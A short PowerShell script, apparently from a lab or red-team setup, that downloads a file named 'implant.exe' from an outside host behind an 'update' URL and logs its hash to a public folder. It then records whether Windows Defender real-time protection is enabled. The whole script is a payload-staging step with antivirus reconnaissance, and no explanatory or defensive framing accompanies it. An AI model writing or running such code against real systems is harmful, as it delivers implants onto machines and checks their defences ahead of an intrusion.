$out = 'C:\Users\Public\lab-stage.txt'
try {
  Invoke-WebRequest -Uri 'https://avln.nora.systems/cdn/update?nocache=1' -OutFile 'C:\bench\implant.exe' -UseBasicParsing -ErrorAction Stop
  $h = Get-FileHash 'C:\bench\implant.exe' -Algorithm SHA256
  "download OK: $($h.Hash.ToLower()) size $((Get-Item C:\bench\implant.exe).Length)" | Out-File $out -Encoding utf8
} catch {
  "download FAILED: $($_.Exception.Message)" | Out-File $out -Encoding utf8
}
"wd-realtime: $((Get-MpComputerStatus).RealTimeProtectionEnabled)" | Out-File $out -Append -Encoding utf8
